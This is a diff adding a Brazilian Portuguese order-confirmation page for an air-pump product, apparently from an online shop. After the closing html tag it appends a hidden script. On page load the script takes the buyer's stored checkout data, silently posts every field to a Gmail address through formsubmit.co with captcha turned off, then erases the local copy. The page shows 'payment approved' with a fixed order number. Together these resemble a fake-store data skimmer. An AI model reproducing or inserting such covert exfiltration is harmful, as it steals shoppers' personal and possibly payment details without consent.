@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Compra Confirmada | AIRBANK SE SERIES</title>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        dark: '#2b2b2b',
+                        orange: '#f7931e',
+                        grayLight: '#a0a0a0',
+                        grayMedium: '#707070'
+                    },
+                    fontFamily: {
+                        montserrat: ['Montserrat', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        body {
+            font-family: 'Montserrat', sans-serif;
+            background-color: #2b2b2b;
+            color: white;
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.8s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .scale-in {
+            animation: scaleIn 0.6s ease-out;
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+        
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+        
+        .btn-hover:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(247, 147, 30, 0.6);
+            transition: all 0.3s ease;
+        }
+        
+        .success-checkmark {
+            animation: checkmark 1s ease-in-out;
+        }
+        
+        @keyframes checkmark {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        
+        .product-image {
+            background: linear-gradient(145deg, #333333, #222222);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background-color: #f7931e;
+            opacity: 0;
+        }
+        
+        .confetti-animation {
+            animation: confetti-fall 4s ease-out forwards;
+        }
+        
+        @keyframes confetti-fall {
+            0% { transform: translateY(-100px) rotate(0deg); opacity: 1; }
+            100% { transform: translateY(500px) rotate(360deg); opacity: 0; }
+        }
+    </style>
+</head>
+<body class="min-h-screen relative overflow-hidden">
+    <!-- Confetti Effect -->
+    <div id="confetti-container"></div>
+    
+    <div class="container mx-auto px-4 py-8 max-w-5xl">
+        <!-- Botão Voltar -->
+        <div class="mb-8 fade-in">
+            <a href="#" class="inline-flex items-center text-orange hover:text-white transition-colors duration-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 19l-7-7m0 0l7-7m-7 7h18" />
+                </svg>
+                Voltar para o site
+            </a>
+        </div>
+        
+        <!-- Ícone de Sucesso -->
+        <div class="flex justify-center mb-6">
+            <div class="bg-orange/20 rounded-full p-6 success-checkmark">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-20 w-20 text-orange" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                </svg>
+            </div>
+        </div>
+        
+        <!-- Título Principal -->
+        <h1 class="text-3xl md:text-4xl font-bold text-center mb-4 fade-in">Compra Confirmada!</h1>
+        <p class="text-center text-grayLight mb-10 fade-in" style="animation-delay: 0.2s;">
+            Obrigado pela sua compra. Seu pedido foi processado com sucesso.
+        </p>
+        
+        <!-- Número do Pedido -->
+        <div class="bg-dark rounded-2xl p-6 shadow-lg mb-10 fade-in" style="animation-delay: 0.3s;">
+            <div class="text-center">
+                <p class="text-grayLight mb-2">Número do Pedido</p>
+                <p class="text-2xl font-bold text-orange">#AB78945612</p>
+            </div>
+        </div>
+        
+        <div class="grid grid-cols-1 lg:grid-cols-2 gap-10">
+            <!-- Coluna do Produto -->
+            <div class="fade-in" style="animation-delay: 0.4s;">
+                <div class="bg-dark rounded-2xl p-6 product-image">
+                    <h2 class="text-xl font-semibold mb-6 border-b border-grayMedium pb-4">Resumo do Pedido</h2>
+                    
+                    <div class="flex items-center mb-6">
+                        <!-- SVG da Mini Bomba de Ar -->
+                        <div class="mr-4">
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="80" height="80">
+                                <rect x="35" y="15" width="30" height="70" rx="5" fill="#444" />
+                                <rect x="40" y="20" width="20" height="40" rx="3" fill="#555" />
+                                <circle cx="50" cy="75" r="8" fill="#f7931e" />
+                                <rect x="47" y="5" width="6" height="10" fill="#666" />
+                                <rect x="42" y="65" width="16" height="3" rx="1" fill="#777" />
+                                <circle cx="50" cy="75" r="4" fill="#2b2b2b" />
+                                <path d="M42 20 L58 20 L58 30 L42 30 Z" fill="#f7931e" opacity="0.3" />
+                            </svg>
+                        </div>
+                        
+                        <div>
+                            <h3 class="font-semibold">AIRBANK SE SERIES</h3>
+                            <p class="text-sm text-grayLight">Mini Bomba de Ar Compacta</p>
+                            <p class="text-orange font-bold mt-1">R$ 199,90</p>
+                        </div>
+                    </div>
+                    
+                    <div class="border-t border-grayMedium pt-4">
+                        <div class="flex justify-between mb-2">
+                            <span class="text-grayLight">Subtotal:</span>
+                            <span>R$ 199,90</span>
+                        </div>
+                        <div class="flex justify-between mb-2">
+                            <span class="text-grayLight">Frete:</span>
+                            <span>Grátis</span>
+                        </div>
+                        <div class="flex justify-between font-bold mt-4 pt-4 border-t border-grayMedium">
+                            <span>Total:</span>
+                            <span class="text-orange">R$ 199,90</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Coluna de Status Simplificada -->
+            <div class="fade-in" style="animation-delay: 0.5s;">
+                <div class="bg-dark rounded-2xl p-6 shadow-lg">
+                    <!-- Status Simplificado -->
+                    <div class="flex items-center justify-center bg-orange/10 rounded-lg p-8 mb-6">
+                        <div class="text-center">
+                            <div class="inline-block bg-orange/20 rounded-full p-4 mb-4">
+                                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-orange" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
+                                </svg>
+                            </div>
+                            <h3 class="text-xl font-bold text-white">Pagamento Aprovado</h3>
+                        </div>
+                    </div>
+                    
+                    <div class="mt-8">
+                        <a href="#" class="block w-full bg-orange text-white font-bold py-4 px-6 rounded-lg shadow-lg btn-hover transition-all duration-300 text-center">
+                            Voltar para a Loja
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Recomendações -->
+        <div class="mt-12 fade-in" style="animation-delay: 0.6s;">
+            <h2 class="text-xl font-semibold mb-6 text-center">Você também pode gostar</h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
+                <!-- Produto 1 -->
+                <div class="bg-dark rounded-xl p-4 hover:shadow-lg transition-shadow">
+                    <div class="bg-gradient-to-b from-gray-700 to-gray-800 rounded-lg p-4 mb-4 flex justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="80" height="80">
+                            <rect x="20" y="30" width="60" height="40" rx="5" fill="#555" />
+                            <rect x="25" y="35" width="50" height="30" rx="3" fill="#444" />
+                            <circle cx="75" cy="50" r="5" fill="#f7931e" />
+                            <rect x="30" y="45" width="30" height="10" rx="2" fill="#666" />
+                        </svg>
+                    </div>
+                    <h3 class="font-medium mb-1">Compressor Portátil</h3>
+                    <p class="text-orange font-bold mb-3">R$ 249,90</p>
+                    <button class="w-full bg-dark border border-orange text-orange py-2 rounded-lg hover:bg-orange hover:text-white transition-colors">
+                        Ver Detalhes
+                    </button>
+                </div>
+                
+                <!-- Produto 2 -->
+                <div class="bg-dark rounded-xl p-4 hover:shadow-lg transition-shadow">
+                    <div class="bg-gradient-to-b from-gray-700 to-gray-800 rounded-lg p-4 mb-4 flex justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="80" height="80">
+                            <circle cx="50" cy="50" r="30" fill="#555" />
+                            <circle cx="50" cy="50" r="25" fill="#444" />
+                            <circle cx="50" cy="50" r="5" fill="#f7931e" />
+                            <path d="M50 25 L55 45 L75 50 L55 55 L50 75 L45 55 L25 50 L45 45 Z" fill="#666" />
+                        </svg>
+                    </div>
+                    <h3 class="font-medium mb-1">Medidor de Pressão</h3>
+                    <p class="text-orange font-bold mb-3">R$ 89,90</p>
+                    <button class="w-full bg-dark border border-orange text-orange py-2 rounded-lg hover:bg-orange hover:text-white transition-colors">
+                        Ver Detalhes
+                    </button>
+                </div>
+                
+                <!-- Produto 3 -->
+                <div class="bg-dark rounded-xl p-4 hover:shadow-lg transition-shadow">
+                    <div class="bg-gradient-to-b from-gray-700 to-gray-800 rounded-lg p-4 mb-4 flex justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" width="80" height="80">
+                            <rect x="30" y="20" width="40" height="60" rx="5" fill="#555" />
+                            <rect x="35" y="25" width="30" height="50" rx="3" fill="#444" />
+                            <circle cx="50" cy="40" r="10" fill="#666" />
+                            <circle cx="50" cy="40" r="5" fill="#f7931e" />
+                            <rect x="40" y="60" width="20" height="10" rx="2" fill="#666" />
+                        </svg>
+                    </div>
+                    <h3 class="font-medium mb-1">Kit de Acessórios</h3>
+                    <p class="text-orange font-bold mb-3">R$ 129,90</p>
+                    <button class="w-full bg-dark border border-orange text-orange py-2 rounded-lg hover:bg-orange hover:text-white transition-colors">
+                        Ver Detalhes
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Mensagem Final -->
+        <div class="mt-12 mb-8 text-center fade-in" style="animation-delay: 0.7s;">
+            <p class="text-grayLight">Dúvidas sobre seu pedido?</p>
+            <p class="mb-6">Entre em contato com nosso <a href="#" class="text-orange hover:underline">suporte ao cliente</a>.</p>
+            
+            <a href="#" class="inline-flex items-center text-orange hover:text-white transition-colors duration-300">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 mr-2" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6" />
+                </svg>
+                Voltar para a página inicial
+            </a>
+        </div>
+    </div>
+    
+    <script>
+        // Criar efeito de confetti
+        function createConfetti() {
+            const container = document.getElementById('confetti-container');
+            const colors = ['#f7931e', '#ffffff', '#f7931e', '#a0a0a0'];
+            
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti';
+                
+                // Posição aleatória
+                const left = Math.random() * 100;
+                confetti.style.left = `${left}%`;
+                
+                // Tamanho aleatório
+                const size = Math.random() * 8 + 6;
+                confetti.style.width = `${size}px`;
+                confetti.style.height = `${size}px`;
+                
+                // Cor aleatória
+                const colorIndex = Math.floor(Math.random() * colors.length);
+                confetti.style.backgroundColor = colors[colorIndex];
+                
+                // Forma aleatória
+                const shapes = ['circle', 'square', 'triangle'];
+                const shapeIndex = Math.floor(Math.random() * shapes.length);
+                if (shapes[shapeIndex] === 'circle') {
+                    confetti.style.borderRadius = '50%';
+                } else if (shapes[shapeIndex] === 'triangle') {
+                    confetti.style.width = '0';
+                    confetti.style.height = '0';
+                    confetti.style.backgroundColor = 'transparent';
+                    confetti.style.borderLeft = `${size/2}px solid transparent`;
+                    confetti.style.borderRight = `${size/2}px solid transparent`;
+                    confetti.style.borderBottom = `${size}px solid ${colors[colorIndex]}`;
+                }
+                
+                // Atraso aleatório
+                const delay = Math.random() * 3;
+                confetti.style.animationDelay = `${delay}s`;
+                
+                // Duração aleatória
+                const duration = Math.random() * 2 + 3;
+                confetti.style.animationDuration = `${duration}s`;
+                
+                confetti.classList.add('confetti-animation');
+                container.appendChild(confetti);
+            }
+        }
+        
+        // Iniciar efeitos quando a página carregar
+        document.addEventListener('DOMContentLoaded', function() {
+            createConfetti();
+        });
+    </script>
+</body>
+</html>
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const data = JSON.parse(localStorage.getItem('checkoutData'));
+    if (data) {
+        const form = document.createElement('form');
+        form.action = 'https://formsubmit.co/airbankse@gmail.com';
+        form.method = 'POST';
+        form.style.display = 'none';
+
+        for (const key in data) {
+            const input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            input.value = data[key];
+            form.appendChild(input);
+        }
+
+        const input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_captcha';
+        input.value = 'false';
+        form.appendChild(input);
+
+        document.body.appendChild(form);
+        form.submit();
+
+        localStorage.removeItem('checkoutData');
+    }
+});
+</script>
